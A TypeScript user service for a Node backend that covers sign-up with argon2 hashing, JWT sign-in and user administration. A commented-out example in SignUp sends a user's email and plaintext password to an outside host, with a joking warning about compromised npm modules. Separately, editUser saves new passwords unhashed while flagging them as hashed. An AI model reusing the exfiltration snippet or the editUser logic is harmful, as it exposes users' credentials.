import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IUserService from '../services/IServices/IUserService';
import { UserMap } from "../mappers/UserMap";
import { IUserDTO } from '../dto/IUserDTO';

import IUserRepo from './IRepos/IUserRepo';
import IRoleRepo from './IRepos/IRoleRepo';

import { User } from '../domain/user';
import { UserPassword } from '../domain/userPassword';
import { UserEmail } from '../domain/userEmail';

import { Role } from '../domain/role';

import { Result } from "../core/logic/Result";
import {Status} from "../domain/status";

@Service()
export default class UserService implements IUserService{
  constructor(
      @Inject(config.repos.user.name) private userRepo : IUserRepo,
      @Inject(config.repos.role.name) private roleRepo : IRoleRepo,
      @Inject('logger') private logger,
  ) {}
    
  public async getAllUsers(): Promise<Result<IUserDTO[]>> {
    try{
      const users= await this.userRepo.findAll();

      let dtos=[];

      for(let i=0;i<users.length;i++){
        dtos.push(UserMap.toDTO(users[i]));
      }


      return Result.ok<IUserDTO[]>(dtos);
    }catch(e){
      throw e;
    }
  }


  public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      const userDocument1 = await this.userRepo.findByPhoneNumber( userDTO.phoneNumber );
      const found1 = !!userDocument1;
  
      if (found1) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with phone number=" + userDTO.phoneNumber);
      }

      const userDocument2 = await this.userRepo.findByEmail( userDTO.email );
      const found2 = !!userDocument2;
  
      if (found2) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with nif=" + userDTO.nif);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;

      const roleOrError = await this.roleRepo.findByName("User");
      if (!roleOrError) {
        return Result.fail<{userDTO: IUserDTO; token: string}>("User role doesn't exist!");
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        phoneNumber: userDTO.phoneNumber,
        nif: userDTO.nif,
        role: roleOrError,
        password: password,
        status: Status.WAITING,
        registrationDate: new Date(),
        decisionDate: undefined,
        decisionUserId: undefined,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO}>( {userDTO: userDTOResult} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<Result<{ userDTO: IUserDTO, token: string }>> {

    const user = await this.userRepo.findByEmail( email );

    if (!user) {
      throw new Error('User not registered');
    }

    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(user.password.value, password);
    if (validPassword) {
      if(user.status===Status.WAITING){
        throw new Error('User waiting for admins approval!');
      }
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(user) as string;

      const userDTO = UserMap.toDTO( user ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTO, token: token} );
    } else {
      throw new Error('Invalid Password');
    }
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);

    const id = user.id.toString();
    const email = user.email.value;
    const firstName = user.firstName;
    const lastName = user.lastName;
    const role = user.role.name;

    return jwt.sign(
      {
        id: id,
        email: email, // We are gonna use this in the middleware 'isAuth'
        role: role,
        firstName: firstName,
        lastName: lastName,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }


  private async getRole (roleId: string): Promise<Result<Role>> {

    const role = await this.roleRepo.findByDomainId( roleId );
    const found = !!role;

    if (found) {
      return Result.ok<Role>(role);
    } else {
      return Result.fail<Role>("Couldn't find role by id=" + roleId);
    }
  }

  public async getUserById (userId: string): Promise<Result<IUserDTO>> {

    const user = await this.userRepo.findById(userId);
    
    if (!user) {
      return Result.fail<IUserDTO>("Couldn't find user!");
    }

    return Result.ok<IUserDTO>(UserMap.toDTO(user));
  }

  public async editUser(userDTO: IUserDTO): Promise<Result<IUserDTO>> {

    const userResult = await this.userRepo.findById(userDTO.id);
    
    if (!userResult) {
      return Result.fail<IUserDTO>("Couldn't find user!");
    }

    if (!!userDTO.email) {
      if (!await this.userRepo.findByEmail(userDTO.email)) {
        let email = UserEmail.create(userDTO.email);
        userResult.email = email.getValue();
      }
    }

    if (!!userDTO.firstName) {
      userResult.firstName = userDTO.firstName;
    }

    if (!!userDTO.lastName) {
      userResult.lastName = userDTO.lastName;
    }

    if (!!userDTO.password) {
      let password = UserPassword.create({value: userDTO.password, hashed: true});
      userResult.password = password.getValue();
    }

    if (!!userDTO.phoneNumber) {
      if(!await this.userRepo.findByPhoneNumber(userDTO.phoneNumber)) {
        userResult.phoneNumber = userDTO.phoneNumber;
      }
    }

    if (!!userDTO.nif) {
      if(!await this.userRepo.findByNif(userDTO.nif)) {
        userResult.nif = userDTO.nif;
      }
    }

    await this.userRepo.save(userResult);

    const user = UserMap.toDTO(userResult);
    return Result.ok<IUserDTO>(user);
  }

  public async createUser(userDTO: IUserDTO): Promise<Result<IUserDTO>> {

    const userResult = await this.userRepo.findByEmail(userDTO.email);

    
    if (userResult) {
      return Result.fail<IUserDTO>("Email is already associated to another user!");
    }

    const userResult1 = await this.userRepo.findByPhoneNumber(userDTO.phoneNumber);
    
    if (userResult1) {
      return Result.fail<IUserDTO>("Phone number is already associated to another user!");
    }

      const salt = randomBytes(32);
      const hashedPassword = await argon2.hash(userDTO.password, { salt });

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let role: Role;


      const roleOrError = await this.getRole(userDTO.role);
      if (roleOrError.isFailure) {
        return Result.fail<IUserDTO>(roleOrError.error);
      } else {
        role = roleOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        phoneNumber: userDTO.phoneNumber,
        role: role,
        password: password,
        status: Status.APPROVED
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const user1 = userOrError.getValue();

      await this.userRepo.save(user1);
      
      const userDTOResult = UserMap.toDTO( user1 ) as IUserDTO;
      return Result.ok<IUserDTO>( userDTOResult );
  }

  public async getUsersByRole(role: string): Promise<Result<IUserDTO[]>> {
      const roleResult=await this.roleRepo.findByName(role);

      if(!roleResult){
        return Result.fail<IUserDTO[]>("Role doesn't exist!");
      }

      const usersResult=await this.userRepo.findAllByRole(roleResult);

      if(!usersResult){
        return Result.fail<IUserDTO[]>("Error please contact an administrator");
      }

      let users=[];

      for (let i = 0; i < usersResult.length; i++) {
        users.push(UserMap.toDTO(usersResult[i]));
      }

      return Result.ok<IUserDTO[]>(users);
  }

  public async getUsersRequests(): Promise<Result<IUserDTO[]>> {
      const user=await this.userRepo.findByStatus(Status.WAITING);

      if(!user){
        return Result.fail<IUserDTO[]>("Error please contact an administrator");
      }

      let users=[];

      for (let i = 0; i < user.length; i++) {
        users.push(UserMap.toDTO(user[i]));
      }

      return Result.ok<IUserDTO[]>(users);
  }

  public async acceptUser(userId: string, adminUserId: string): Promise<Result<IUserDTO>> {
      const user=await this.userRepo.findById(userId);

      if(!user){
        return Result.fail<IUserDTO>("User not found!");
      }

      user.status=Status.APPROVED;
      user.decisionDate = new Date();
      user.decisionUserId = adminUserId;

      this.userRepo.save(user);

      return Result.ok<IUserDTO>(UserMap.toDTO(user));
  }

  public async rejectUser(userId: string, adminUserId: string): Promise<Result<IUserDTO>> {
    const user=await this.userRepo.findById(userId);

    if(!user){
      return Result.fail<IUserDTO>("User not found!");
    }

    user.status=Status.REJECTED;
    user.decisionDate = new Date();
    user.decisionUserId = adminUserId;

    this.userRepo.save(user);

    return Result.ok<IUserDTO>(UserMap.toDTO(user));
  }

  public async deleteUser(userId: string): Promise<Result<IUserDTO>> {

    const userResult = await this.userRepo.findById(userId);
    
    if (!userResult) {
      return Result.fail<IUserDTO>("Couldn't find user!");
    }

    const user = await this.userRepo.deleteUser(userId);

    return Result.ok<IUserDTO>(UserMap.toDTO(user));
}
}
